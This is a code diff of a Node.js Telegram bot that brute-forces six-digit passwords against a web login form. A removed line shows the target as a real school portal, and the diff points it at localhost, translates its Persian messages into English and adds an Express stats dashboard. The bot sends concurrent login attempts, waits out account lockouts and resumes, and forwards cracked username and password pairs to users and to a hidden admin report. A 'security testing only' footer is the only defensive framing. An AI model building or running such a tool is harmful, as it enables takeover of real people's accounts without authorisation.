@@ -4,10 +4,12 @@ const axios = require("axios");
 const cheerio = require("cheerio");
 const { wrapper } = require("axios-cookiejar-support");
 const { CookieJar } = require("tough-cookie");
+const express = require("express");
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
-const LOGIN_URL = "https://haftometir.modabberonline.com/Login.aspx?ReturnUrl=%2f&AspxAutoDetectCookieSupport=1";
+const LOGIN_URL = "http://localhost:3000/Login.aspx";
+const PORT = process.env.PORT || 3000;
 
 const START = 0;
 const END = 999999;
@@ -17,6 +19,7 @@ const LOCK_RETRY_DELAY = 5 * 60 * 1000;
 const DAILY_REPORT_HOUR = 0;
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+const app = express();
 
 const runningTasks = new Map();
 
@@ -25,7 +28,7 @@ const authorizedUsers = new Set();
 const usedUsers = new Set();
 
 let dailyLog = {
-  date: new Date().toLocaleDateString("fa-IR"),
+  date: new Date().toISOString().split("T")[0],
   accessRequests: [],
   newUsers: [],
   successfulLogins: [],
@@ -35,26 +38,33 @@ let dailyLog = {
   revokedUsers: [],
 };
 
+let botStats = {
+  startTime: Date.now(),
+  totalRequests: 0,
+  totalSuccess: 0,
+  totalFailed: 0,
+};
+
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 function logReceivedMessage(msg) {
   const logEntry = {
-    time: new Date().toLocaleTimeString("fa-IR"),
+    time: new Date().toISOString(),
     userId: msg.chat.id,
-    username: msg.from.username || "بدون یوزرنیم",
+    username: msg.from.username || "no_username",
     firstName: msg.from.first_name || "Unknown",
-    message: msg.text || "پیام غیرمتنی",
+    message: msg.text || "non-text message",
   };
   dailyLog.receivedMessages.push(logEntry);
 }
 
 async function sendDailyReport() {
-  let report = `📊 *گزارش روزانه*\n`;
-  report += `📅 تاریخ: ${dailyLog.date}\n`;
-  report += `⏰ زمان: ${new Date().toLocaleTimeString("fa-IR")}\n\n`;
+  let report = `📊 *Daily Report*\n`;
+  report += `📅 Date: ${dailyLog.date}\n`;
+  report += `⏰ Time: ${new Date().toISOString()}\n\n`;
 
   if (dailyLog.accessRequests.length > 0) {
-    report += `🔔 *درخواست‌های دسترسی:* (${dailyLog.accessRequests.length})\n`;
+    report += `🔔 *Access Requests:* (${dailyLog.accessRequests.length})\n`;
     dailyLog.accessRequests.forEach((req, index) => {
       if (index < 10) {
         report += `   ${index + 1}. \`${req.userId}\` - ${req.name} - ${
@@ -63,13 +73,13 @@ async function sendDailyReport() {
       }
     });
     if (dailyLog.accessRequests.length > 10) {
-      report += `   ... و ${dailyLog.accessRequests.length - 10} مورد دیگر\n`;
+      report += `   ... and ${dailyLog.accessRequests.length - 10} more\n`;
     }
     report += "\n";
   }
 
   if (dailyLog.newUsers.length > 0) {
-    report += `✅ *کاربران جدید استفاده کننده:* (${dailyLog.newUsers.length})\n`;
+    report += `✅ *New Users:* (${dailyLog.newUsers.length})\n`;
     dailyLog.newUsers.forEach((user, index) => {
       if (index < 10) {
         report += `   ${index + 1}. \`${user.userId}\` - ${user.username} - ${
@@ -78,13 +88,13 @@ async function sendDailyReport() {
       }
     });
     if (dailyLog.newUsers.length > 10) {
-      report += `   ... و ${dailyLog.newUsers.length - 10} مورد دیگر\n`;
+      report += `   ... and ${dailyLog.newUsers.length - 10} more\n`;
     }
     report += "\n";
   }
 
   if (dailyLog.successfulLogins.length > 0) {
-    report += `🎉 *پسوردهای پیدا شده:* (${dailyLog.successfulLogins.length})\n`;
+    report += `🎉 *Found Passwords:* (${dailyLog.successfulLogins.length})\n`;
     dailyLog.successfulLogins.forEach((login, index) => {
       report += `   ${index + 1}. Username: \`${login.username}\` - Pass: \`${
         login.password
@@ -94,22 +104,22 @@ async function sendDailyReport() {
   }
 
   if (dailyLog.completedTasks.length > 0) {
-    report += `✅ *تست‌های تمام شده:* (${dailyLog.completedTasks.length})\n`;
+    report += `✅ *Completed Tasks:* (${dailyLog.completedTasks.length})\n`;
     dailyLog.completedTasks.forEach((task, index) => {
       if (index < 10) {
-        report += `   ${index + 1}. \`${task.username}\` - موفق: ${
+        report += `   ${index + 1}. \`${task.username}\` - Success: ${
           task.success
         } - ${task.time}\n`;
       }
     });
     if (dailyLog.completedTasks.length > 10) {
-      report += `   ... و ${dailyLog.completedTasks.length - 10} مورد دیگر\n`;
+      report += `   ... and ${dailyLog.completedTasks.length - 10} more\n`;
     }
     report += "\n";
   }
 
   if (dailyLog.addedUsers.length > 0) {
-    report += `➕ *کاربران مجاز شده:* (${dailyLog.addedUsers.length})\n`;
+    report += `➕ *Authorized Users:* (${dailyLog.addedUsers.length})\n`;
     dailyLog.addedUsers.forEach((user, index) => {
       report += `   ${index + 1}. \`${user.userId}\` - ${user.time}\n`;
     });
@@ -117,7 +127,7 @@ async function sendDailyReport() {
   }
 
   if (dailyLog.revokedUsers.length > 0) {
-    report += `➖ *کاربران لغو شده:* (${dailyLog.revokedUsers.length})\n`;
+    report += `➖ *Revoked Users:* (${dailyLog.revokedUsers.length})\n`;
     dailyLog.revokedUsers.forEach((user, index) => {
       report += `   ${index + 1}. \`${user.userId}\` - ${user.time}\n`;
     });
@@ -125,9 +135,9 @@ async function sendDailyReport() {
   }
 
   if (dailyLog.receivedMessages.length > 0) {
-    report += `💬 *پیام‌های دریافتی:* (${dailyLog.receivedMessages.length})\n`;
+    report += `💬 *Received Messages:* (${dailyLog.receivedMessages.length})\n`;
     const uniqueUsers = new Set(dailyLog.receivedMessages.map((m) => m.userId));
-    report += `👥 تعداد کاربران: ${uniqueUsers.size}\n`;
+    report += `👥 Unique Users: ${uniqueUsers.size}\n`;
 
     const lastMessages = dailyLog.receivedMessages.slice(-5);
     lastMessages.forEach((msg, index) => {
@@ -147,13 +157,13 @@ async function sendDailyReport() {
     dailyLog.completedTasks.length === 0 &&
     dailyLog.receivedMessages.length === 0
   ) {
-    report += `💤 *امروز هیچ فعالیتی نبود*\n`;
+    report += `💤 *No activity today*\n`;
   }
 
   await sendTelegram(report);
 
   dailyLog = {
-    date: new Date().toLocaleDateString("fa-IR"),
+    date: new Date().toISOString().split("T")[0],
     accessRequests: [],
     newUsers: [],
     successfulLogins: [],
@@ -226,7 +236,7 @@ async function tryLogin(username, password) {
 
     formData.append("txtUserName", username);
     formData.append("txtPassword", password);
-    formData.append("LoginButton", "ورود به سیستم");
+    formData.append("LoginButton", "Login");
 
     const loginResponse = await client.post(LOGIN_URL, formData, {
       headers: {
@@ -247,6 +257,8 @@ async function tryLogin(username, password) {
       .trim();
     const lockedMessage = $response("#lblErrorForm").text().trim();
 
+    botStats.totalRequests++;
+
     if (
       lockedMessage &&
       (lockedMessage.includes("قفل") || lockedMessage.includes("locked"))
@@ -260,6 +272,7 @@ async function tryLogin(username, password) {
     }
 
     if (errorMessage || loginError || validationError) {
+      botStats.totalFailed++;
       return {
         success: false,
         message: errorMessage || loginError || validationError || "Invalid",
@@ -268,20 +281,27 @@ async function tryLogin(username, password) {
     }
 
     if (loginResponse.status === 302 || loginResponse.status === 301) {
+      botStats.totalSuccess++;
       return { success: true, message: "✅ Redirected", password };
     }
 
     if ($response('input[name="txtUserName"]').length > 0) {
+      botStats.totalFailed++;
       return { success: false, message: "Invalid", password };
     }
 
+    botStats.totalSuccess++;
     return { success: true, message: "✅ Logged in", password };
   } catch (error) {
+    botStats.totalRequests++;
+
     if (error.response && error.response.status === 302) {
+      botStats.totalSuccess++;
       return { success: true, message: "✅ Redirect", password };
     }
 
     if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
+      botStats.totalFailed++;
       return { success: false, message: "⏱️ TIMEOUT", password };
     }
 
@@ -294,6 +314,7 @@ async function tryLogin(username, password) {
       };
     }
 
+    botStats.totalFailed++;
     return { success: false, message: `❌ ${error.message}`, password };
   }
 }
@@ -308,7 +329,7 @@ async function bruteForceUsername(username, chatId) {
   if (runningTasks.has(username) && runningTasks.get(username).isRunning) {
     await bot.sendMessage(
       chatId,
-      `⚠️ \`${username}\` در حال حاضر در حال تست است!`,
+      `⚠️ \`${username}\` is already being tested!`,
       { parse_mode: "Markdown" }
     );
     return;
@@ -328,7 +349,7 @@ async function bruteForceUsername(username, chatId) {
   runningTasks.set(username, task);
 
   const startMessage =
-    `🚀 *شروع تست*\n\n` +
+    `🚀 *Test Started*\n\n` +
     `👤 Username: \`${username}\`\n` +
     `🔑 Range: ${START.toString().padStart(6, "0")} - ${END.toString().padStart(
       6,
@@ -340,7 +361,7 @@ async function bruteForceUsername(username, chatId) {
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
     await sendTelegram(
-      `🔔 *کاربر جدید تست شروع کرد*\n\n` +
+      `🔔 *New User Started Test*\n\n` +
         `👤 Username: \`${username}\`\n` +
         `🆔 User ID: \`${chatId}\``
     );
@@ -350,7 +371,7 @@ async function bruteForceUsername(username, chatId) {
     if (!runningTasks.has(username) || !runningTasks.get(username).isRunning) {
       await bot.sendMessage(
         chatId,
-        `🛑 *تست متوقف شد*\n\n👤 Username: \`${username}\``,
+        `🛑 *Test Stopped*\n\n👤 Username: \`${username}\``,
         { parse_mode: "Markdown" }
       );
       runningTasks.delete(username);
@@ -373,10 +394,10 @@ async function bruteForceUsername(username, chatId) {
       if (result.isLocked) {
         batchHasLock = true;
         const lockMessage =
-          `🔒 *قفل شد!*\n\n` +
+          `🔒 *Account Locked!*\n\n` +
           `👤 Username: \`${username}\`\n` +
           `🔑 Password: \`${result.password}\`\n` +
-          `⏰ صبر ${LOCK_RETRY_DELAY / 1000 / 60} دقیقه...`;
+          `⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`;
 
         await bot.sendMessage(chatId, lockMessage, { parse_mode: "Markdown" });
 
@@ -386,8 +407,8 @@ async function bruteForceUsername(username, chatId) {
         while (stillLocked && runningTasks.get(username)?.isRunning) {
           await bot.sendMessage(
             chatId,
-            `⏰ هنوز قفله: \`${username}\`\n` +
-              `صبر ${LOCK_RETRY_DELAY / 1000 / 60} دقیقه دیگه...`,
+            `⏰ Still locked: \`${username}\`\n` +
+              `Waiting ${LOCK_RETRY_DELAY / 1000 / 60} more minutes...`,
             { parse_mode: "Markdown" }
           );
           await sleep(LOCK_RETRY_DELAY);
@@ -397,7 +418,7 @@ async function bruteForceUsername(username, chatId) {
         if (runningTasks.get(username)?.isRunning) {
           await bot.sendMessage(
             chatId,
-            `✅ قفل باز شد: \`${username}\` - ادامه...`,
+            `✅ Lock released: \`${username}\` - Continuing...`,
             { parse_mode: "Markdown" }
           );
           i -= CONCURRENT_REQUESTS;
@@ -408,7 +429,7 @@ async function bruteForceUsername(username, chatId) {
       if (result.success) {
         task.successCount++;
         const successMessage =
-          `🎉 *پسورد پیدا شد!*\n\n` +
+          `🎉 *Password Found!*\n\n` +
           `👤 Username: \`${username}\`\n` +
           `🔑 Password: \`${result.password}\`\n` +
           `✅ ${result.message}`;
@@ -421,7 +442,7 @@ async function bruteForceUsername(username, chatId) {
           username: username,
           password: result.password,
           userId: chatId,
-          time: new Date().toLocaleTimeString("fa-IR"),
+          time: new Date().toISOString(),
         });
 
         if (chatId.toString() !== ADMIN_CHAT_ID) {
@@ -446,14 +467,14 @@ async function bruteForceUsername(username, chatId) {
 
       await bot.sendMessage(
         chatId,
-        `📊 *پیشرفت*\n\n` +
+        `📊 *Progress Update*\n\n` +
           `👤 Username: \`${username}\`\n` +
-          `🔢 پیشرفت: ${progress}%\n` +
-          `📝 تست شده: ${task.processedCount}\n` +
-          `✅ موفق: ${task.successCount}\n` +
-          `❌ ناموفق: ${task.failedCount}\n` +
-          `⚡ سرعت: ${speed} req/s\n` +
-          `⏱️ زمان: ${elapsed} دقیقه`,
+          `🔢 Progress: ${progress}%\n` +
+          `📝 Tested: ${task.processedCount}\n` +
+          `✅ Success: ${task.successCount}\n` +
+          `❌ Failed: ${task.failedCount}\n` +
+          `⚡ Speed: ${speed} req/s\n` +
+          `⏱️ Time: ${elapsed} min`,
         { parse_mode: "Markdown" }
       );
     }
@@ -466,12 +487,12 @@ async function bruteForceUsername(username, chatId) {
   const totalTime = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
 
   const finalMessage =
-    `✅ *تست تمام شد*\n\n` +
+    `✅ *Test Completed*\n\n` +
     `👤 Username: \`${username}\`\n` +
-    `📊 کل: ${task.processedCount}\n` +
-    `✅ موفق: ${task.successCount}\n` +
-    `❌ ناموفق: ${task.failedCount}\n` +
-    `⏱️ زمان: ${totalTime} دقیقه`;
+    `📊 Total: ${task.processedCount}\n` +
+    `✅ Success: ${task.successCount}\n` +
+    `❌ Failed: ${task.failedCount}\n` +
+    `⏱️ Time: ${totalTime} min`;
 
   await bot.sendMessage(chatId, finalMessage, { parse_mode: "Markdown" });
 
@@ -479,7 +500,7 @@ async function bruteForceUsername(username, chatId) {
     username: username,
     success: task.successCount,
     userId: chatId,
-    time: new Date().toLocaleTimeString("fa-IR"),
+    time: new Date().toISOString(),
   });
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
@@ -488,6 +509,216 @@ async function bruteForceUsername(username, chatId) {
 
   runningTasks.delete(username);
 }
+
+app.use(express.json());
+
+app.get("/", (req, res) => {
+  const uptime = Math.floor((Date.now() - botStats.startTime) / 1000);
+  const hours = Math.floor(uptime / 3600);
+  const minutes = Math.floor((uptime % 3600) / 60);
+  const seconds = uptime % 60;
+
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Telegram Brute Force Bot</title>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <style>
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+        }
+        body {
+          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          min-height: 100vh;
+          padding: 20px;
+        }
+        .container {
+          max-width: 1000px;
+          margin: 50px auto;
+          background: white;
+          padding: 40px;
+          border-radius: 20px;
+          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 {
+          color: #2c3e50;
+          border-bottom: 4px solid #667eea;
+          padding-bottom: 15px;
+          margin-bottom: 30px;
+          font-size: 32px;
+        }
+        .status {
+          display: inline-block;
+          padding: 8px 20px;
+          background: linear-gradient(135deg, #2ecc71, #27ae60);
+          color: white;
+          border-radius: 25px;
+          font-weight: bold;
+          margin-bottom: 20px;
+          box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
+        }
+        .stats {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+          gap: 20px;
+          margin: 30px 0;
+        }
+        .stat-box {
+          background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+          padding: 20px;
+          border-radius: 15px;
+          border-left: 5px solid #667eea;
+          transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .stat-box:hover {
+          transform: translateY(-5px);
+          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+        .stat-label {
+          color: #7f8c8d;
+          font-size: 14px;
+          margin-bottom: 8px;
+          font-weight: 600;
+        }
+        .stat-value {
+          color: #2c3e50;
+          font-size: 28px;
+          font-weight: bold;
+        }
+        .footer {
+          margin-top: 40px;
+          padding-top: 20px;
+          border-top: 2px solid #ecf0f1;
+          text-align: center;
+          color: #7f8c8d;
+          font-size: 14px;
+        }
+        .endpoint {
+          background: #ecf0f1;
+          padding: 15px;
+          border-radius: 8px;
+          margin: 10px 0;
+          font-family: 'Courier New', monospace;
+        }
+        .endpoint-title {
+          font-weight: bold;
+          color: #2c3e50;
+          margin-bottom: 10px;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <h1>🤖 Telegram Brute Force Bot</h1>
+        <p><span class="status">✅ Running</span></p>
+        
+        <div class="stats">
+          <div class="stat-box">
+            <div class="stat-label">⏱️ Uptime</div>
+            <div class="stat-value">${hours}h ${minutes}m ${seconds}s</div>
+          </div>
+          
+          <div class="stat-box">
+            <div class="stat-label">🔄 Running Tasks</div>
+            <div class="stat-value">${runningTasks.size}</div>
+          </div>
+          
+          <div class="stat-box">
+            <div class="stat-label">📊 Total Requests</div>
+            <div class="stat-value">${botStats.totalRequests.toLocaleString()}</div>
+          </div>
+          
+          <div class="stat-box">
+            <div class="stat-label">✅ Success Rate</div>
+            <div class="stat-value">${
+              botStats.totalRequests > 0
+                ? (
+                    (botStats.totalSuccess / botStats.totalRequests) *
+                    100
+                  ).toFixed(2)
+                : 0
+            }%</div>
+          </div>
+          
+          <div class="stat-box">
+            <div class="stat-label">👥 Authorized Users</div>
+            <div class="stat-value">${authorizedUsers.size}</div>
+          </div>
+          
+          <div class="stat-box">
+            <div class="stat-label">📝 Used Users</div>
+            <div class="stat-value">${usedUsers.size}</div>
+          </div>
+          
+          <div class="stat-box">
+            <div class="stat-label">🔓 Public Access</div>
+            <div class="stat-value">${
+              publicAccessEnabled ? "✅ ON" : "❌ OFF"
+            }</div>
+          </div>
+          
+          <div class="stat-box">
+            <div class="stat-label">📅 Today's Messages</div>
+            <div class="stat-value">${dailyLog.receivedMessages.length}</div>
+          </div>
+        </div>
+        
+        <div class="endpoint-title">📡 API Endpoints:</div>
+        <div class="endpoint">GET /health - Health check</div>
+        <div class="endpoint">GET /stats - Statistics JSON</div>
+        <div class="endpoint">GET /ping - Simple ping</div>
+        
+        <div class="footer">
+          <p>🌐 Server running on port ${PORT}</p>
+          <p>🕐 Last updated: ${new Date().toUTCString()}</p>
+          <p>💻 Made for security testing purposes only</p>
+        </div>
+      </div>
+    </body>
+    </html>
+  `);
+});
+
+app.get("/health", (req, res) => {
+  res.json({
+    status: "ok",
+    uptime: Math.floor((Date.now() - botStats.startTime) / 1000),
+    timestamp: new Date().toISOString(),
+    bot: "running",
+  });
+});
+
+app.get("/stats", (req, res) => {
+  res.json({
+    botStats: {
+      ...botStats,
+      uptime: Math.floor((Date.now() - botStats.startTime) / 1000),
+    },
+    runningTasks: runningTasks.size,
+    authorizedUsers: authorizedUsers.size,
+    usedUsers: usedUsers.size,
+    publicAccessEnabled: publicAccessEnabled,
+    dailyLog: {
+      date: dailyLog.date,
+      accessRequests: dailyLog.accessRequests.length,
+      newUsers: dailyLog.newUsers.length,
+      successfulLogins: dailyLog.successfulLogins.length,
+      completedTasks: dailyLog.completedTasks.length,
+      receivedMessages: dailyLog.receivedMessages.length,
+      addedUsers: dailyLog.addedUsers.length,
+      revokedUsers: dailyLog.revokedUsers.length,
+    },
+  });
+});
+
+app.get("/ping", (req, res) => {
+  res.send("pong");
+});
 
 bot.on("message", (msg) => {
   logReceivedMessage(msg);
@@ -498,13 +729,13 @@ bot.onText(/\/start/, async (msg) => {
   const access = hasAccess(chatId);
 
   if (!access.allowed) {
-    let errorMsg = "⛔ شما دسترسی به این ربات ندارید!\n\n";
+    let errorMsg = "⛔ You don't have access to this bot!\n\n";
 
     if (access.reason === "already_used") {
-      errorMsg += "💡 شما قبلاً از این ربات استفاده کرده‌اید.\n";
-      errorMsg += "هر کاربر فقط یک بار می‌تواند استفاده کند.";
+      errorMsg += "💡 You have already used this bot.\n";
+      errorMsg += "Each user can only use it once.";
     } else if (access.reason === "no_access") {
-      errorMsg += "💡 لطفاً از ادمین بخواهید به شما دسترسی بدهد.\n";
+      errorMsg += "💡 Please ask admin to grant you access.\n";
       errorMsg += `🆔 Your ID: \`${chatId}\``;
     }
 
@@ -514,18 +745,18 @@ bot.onText(/\/start/, async (msg) => {
       dailyLog.accessRequests.push({
         userId: chatId,
         name: msg.from.first_name || "Unknown",
-        username: msg.from.username || "بدون یوزرنیم",
-        time: new Date().toLocaleTimeString("fa-IR"),
+        username: msg.from.username || "no_username",
+        time: new Date().toISOString(),
       });
 
       await sendTelegram(
-        `🔔 *درخواست دسترسی جدید*\n\n` +
+        `🔔 *New Access Request*\n\n` +
           `🆔 User ID: \`${chatId}\`\n` +
           `👤 Name: ${msg.from.first_name || "Unknown"}\n` +
           `📝 Username: ${
-            msg.from.username ? "@" + msg.from.username : "ندارد"
+            msg.from.username ? "@" + msg.from.username : "None"
           }\n\n` +
-          `💡 برای دادن دسترسی:\n\`/access ${chatId}\``
+          `💡 To grant access:\n\`/access ${chatId}\``
       );
     }
 
@@ -533,24 +764,24 @@ bot.onText(/\/start/, async (msg) => {
   }
 
   const welcomeMessage = `
-🤖 *ربات Brute Force Test*
+🤖 *Brute Force Test Bot*
 
-📋 *دستورات اصلی:*
+📋 *Main Commands:*
 
-/add \`username\` - اضافه کردن و شروع تست
-/stop \`username\` - توقف یک تست خاص
-/list - لیست تست‌های در حال اجرا
-/status - وضعیت کلی
-/help - راهنما
+/add \`username\` - Add and start test
+/stop \`username\` - Stop specific test
+/list - List running tests
+/status - Overall status
+/help - Help guide
 
-*مثال:*
+*Example:*
 \`/add 0123456789\`
 \`/stop 0123456789\`
 
 ${
   access.isAdmin
-    ? `\n🔧 *دستورات ادمین:*\n/allaccess - فعال/غیرفعال دسترسی عمومی\n/access <user_id> - دادن دسترسی به کاربر\n/revoke <user_id> - حذف دسترسی کاربر\n/users - لیست کاربران\n/todaylog - گزارش امروز\n/resetall - ریست کامل سیستم`
-    : `\n⚠️ *توجه:* شما فقط یک بار می‌توانید از ربات استفاده کنید!`
+    ? `\n🔧 *Admin Commands:*\n/allaccess - Toggle public access\n/access <user_id> - Grant user access\n/revoke <user_id> - Revoke user access\n/users - List users\n/todaylog - Today's report\n/resetall - Reset all`
+    : `\n⚠️ *Note:* You can only use this bot once!`
 }
   `;
 
@@ -562,12 +793,12 @@ bot.onText(/\/add (.+)/, async (msg, match) => {
   const access = hasAccess(chatId);
 
   if (!access.allowed) {
-    let errorMsg = "⛔ شما دسترسی به این ربات ندارید!\n\n";
+    let errorMsg = "⛔ You don't have access to this bot!\n\n";
 
     if (access.reason === "already_used") {
-      errorMsg += "💡 شما قبلاً از این ربات استفاده کرده‌اید.";
+      errorMsg += "💡 You have already used this bot.";
     } else if (access.reason === "no_access") {
-      errorMsg += `💡 لطفاً از ادمین دسترسی بگیرید.\n🆔 Your ID: \`${chatId}\``;
+      errorMsg += `💡 Please request access from admin.\n🆔 Your ID: \`${chatId}\``;
     }
 
     bot.sendMessage(chatId, errorMsg, { parse_mode: "Markdown" });
@@ -579,7 +810,7 @@ bot.onText(/\/add (.+)/, async (msg, match) => {
   if (!username) {
     bot.sendMessage(
       chatId,
-      "❌ لطفاً username را وارد کنید!\n\nمثال: `/add 0123456789`",
+      "❌ Please enter username!\n\nExample: `/add 0123456789`",
       {
         parse_mode: "Markdown",
       }
@@ -592,26 +823,26 @@ bot.onText(/\/add (.+)/, async (msg, match) => {
 
     dailyLog.newUsers.push({
       userId: chatId,
-      username: msg.from.username || "بدون یوزرنیم",
+      username: msg.from.username || "no_username",
       targetUsername: username,
-      time: new Date().toLocaleTimeString("fa-IR"),
+      time: new Date().toISOString(),
     });
 
     bot.sendMessage(
       chatId,
-      `✅ شروع تست برای \`${username}\`...\n\n⚠️ شما دیگر نمی‌توانید از ربات استفاده کنید.`,
+      `✅ Starting test for \`${username}\`...\n\n⚠️ You can no longer use this bot.`,
       {
         parse_mode: "Markdown",
       }
     );
   } else {
-    bot.sendMessage(chatId, `✅ شروع تست برای \`${username}\`...`, {
+    bot.sendMessage(chatId, `✅ Starting test for \`${username}\`...`, {
       parse_mode: "Markdown",
     });
   }
 
   bruteForceUsername(username, chatId).catch((err) => {
-    bot.sendMessage(chatId, `❌ خطا در \`${username}\`: ${err.message}`, {
+    bot.sendMessage(chatId, `❌ Error with \`${username}\`: ${err.message}`, {
       parse_mode: "Markdown",
     });
   });
@@ -625,7 +856,7 @@ bot.onText(/\/stop (.+)/, async (msg, match) => {
   if (!username) {
     bot.sendMessage(
       chatId,
-      "❌ لطفاً username را وارد کنید!\n\nمثال: `/stop 0123456789`",
+      "❌ Please enter username!\n\nExample: `/stop 0123456789`",
       {
         parse_mode: "Markdown",
       }
@@ -634,7 +865,7 @@ bot.onText(/\/stop (.+)/, async (msg, match) => {
   }
 
   if (!runningTasks.has(username)) {
-    bot.sendMessage(chatId, `⚠️ \`${username}\` در حال اجرا نیست!`, {
+    bot.sendMessage(chatId, `⚠️ \`${username}\` is not running!`, {
       parse_mode: "Markdown",
     });
     return;
@@ -647,13 +878,13 @@ bot.onText(/\/stop (.+)/, async (msg, match) => {
     task.chatId &&
     task.chatId.toString() !== chatId.toString()
   ) {
-    bot.sendMessage(chatId, `⛔ شما نمی‌توانید تست دیگران را متوقف کنید!`);
+    bot.sendMessage(chatId, `⛔ You cannot stop other users' tests!`);
     return;
   }
 
   task.isRunning = false;
 
-  bot.sendMessage(chatId, `🛑 در حال توقف \`${username}\`...`, {
+  bot.sendMessage(chatId, `🛑 Stopping \`${username}\`...`, {
     parse_mode: "Markdown",
   });
 });
@@ -663,11 +894,11 @@ bot.onText(/\/list/, async (msg) => {
   const access = hasAccess(chatId);
 
   if (runningTasks.size === 0) {
-    bot.sendMessage(chatId, "💤 هیچ تستی در حال اجرا نیست.");
+    bot.sendMessage(chatId, "💤 No tests are running.");
     return;
   }
 
-  let message = `📋 *تست‌های در حال اجرا:* (${runningTasks.size} تا)\n\n`;
+  let message = `📋 *Running Tests:* (${runningTasks.size})\n\n`;
   let hasAnyTask = false;
 
   runningTasks.forEach((task, username) => {
@@ -682,9 +913,9 @@ bot.onText(/\/list/, async (msg) => {
     ) {
       hasAnyTask = true;
       message += `👤 \`${username}\`\n`;
-      message += `   📊 پیشرفت: ${progress}%\n`;
-      message += `   ✅ موفق: ${task.successCount}\n`;
-      message += `   ⏱️ زمان: ${elapsed}m\n`;
+      message += `   📊 Progress: ${progress}%\n`;
+      message += `   ✅ Success: ${task.successCount}\n`;
+      message += `   ⏱️ Time: ${elapsed}m\n`;
       if (access.isAdmin && task.chatId) {
         message += `   🆔 User: \`${task.chatId}\`\n`;
       }
@@ -693,7 +924,7 @@ bot.onText(/\/list/, async (msg) => {
   });
 
   if (!hasAnyTask) {
-    bot.sendMessage(chatId, "💤 شما تستی در حال اجرا ندارید.");
+    bot.sendMessage(chatId, "💤 You have no running tests.");
     return;
   }
 
@@ -719,29 +950,27 @@ bot.onText(/\/status/, async (msg) => {
   });
 
   const message = `
-📊 *وضعیت کلی ربات*
+📊 *Bot Status*
 
-⚡ تست‌های فعال: ${totalRunning}
-✅ کل موفق: ${totalSuccess}
-🔢 کل پردازش شده: ${totalProcessed}
-${!access.isAdmin ? `\n👤 تست‌های شما: ${myTasks}` : ""}
+⚡ Active Tests: ${totalRunning}
+✅ Total Success: ${totalSuccess}
+🔢 Total Processed: ${totalProcessed}
+${!access.isAdmin ? `\n👤 Your Tasks: ${myTasks}` : ""}
 ${
   access.isAdmin
-    ? `\n\n🔓 دسترسی عمومی: ${
-        publicAccessEnabled ? "✅ فعال" : "❌ غیرفعال"
-      }\n👥 کاربران مجاز: ${authorizedUsers.size}\n📝 کاربران استفاده کننده: ${
+    ? `\n\n🔓 Public Access: ${
+        publicAccessEnabled ? "✅ ON" : "❌ OFF"
+      }\n👥 Authorized Users: ${authorizedUsers.size}\n📝 Used Users: ${
         usedUsers.size
-      }\n\n📊 آمار امروز:\n   🔔 درخواست‌ها: ${
+      }\n\n📊 Today's Stats:\n   🔔 Requests: ${
         dailyLog.accessRequests.length
-      }\n   ✅ کاربران جدید: ${
-        dailyLog.newUsers.length
-      }\n   🎉 پسوردهای پیدا شده: ${
+      }\n   ✅ New Users: ${dailyLog.newUsers.length}\n   🎉 Found Passwords: ${
         dailyLog.successfulLogins.length
-      }\n   💬 پیام‌ها: ${dailyLog.receivedMessages.length}`
+      }\n   💬 Messages: ${dailyLog.receivedMessages.length}`
     : ""
 }
 
-💡 برای جزئیات از /list استفاده کنید
+💡 Use /list for details
   `;
 
   bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
@@ -751,25 +980,25 @@ bot.onText(/\/todaylog/, async (msg) => {
   const chatId = msg.chat.id;
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
-    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
+    bot.sendMessage(chatId, "⛔ This command is admin only!");
     return;
   }
 
-  let report = `📊 *گزارش امروز*\n`;
-  report += `📅 تاریخ: ${dailyLog.date}\n`;
-  report += `⏰ زمان: ${new Date().toLocaleTimeString("fa-IR")}\n\n`;
+  let report = `📊 *Today's Report*\n`;
+  report += `📅 Date: ${dailyLog.date}\n`;
+  report += `⏰ Time: ${new Date().toISOString()}\n\n`;
 
-  report += `📈 *خلاصه:*\n`;
-  report += `🔔 درخواست‌ها: ${dailyLog.accessRequests.length}\n`;
-  report += `✅ کاربران جدید: ${dailyLog.newUsers.length}\n`;
-  report += `🎉 پسوردها: ${dailyLog.successfulLogins.length}\n`;
-  report += `✅ تست‌های تمام شده: ${dailyLog.completedTasks.length}\n`;
-  report += `➕ کاربران مجاز شده: ${dailyLog.addedUsers.length}\n`;
-  report += `➖ کاربران لغو شده: ${dailyLog.revokedUsers.length}\n`;
-  report += `💬 پیام‌ها: ${dailyLog.receivedMessages.length}\n\n`;
+  report += `📈 *Summary:*\n`;
+  report += `🔔 Requests: ${dailyLog.accessRequests.length}\n`;
+  report += `✅ New Users: ${dailyLog.newUsers.length}\n`;
+  report += `🎉 Passwords: ${dailyLog.successfulLogins.length}\n`;
+  report += `✅ Completed: ${dailyLog.completedTasks.length}\n`;
+  report += `➕ Authorized: ${dailyLog.addedUsers.length}\n`;
+  report += `➖ Revoked: ${dailyLog.revokedUsers.length}\n`;
+  report += `💬 Messages: ${dailyLog.receivedMessages.length}\n\n`;
 
   if (dailyLog.accessRequests.length > 0) {
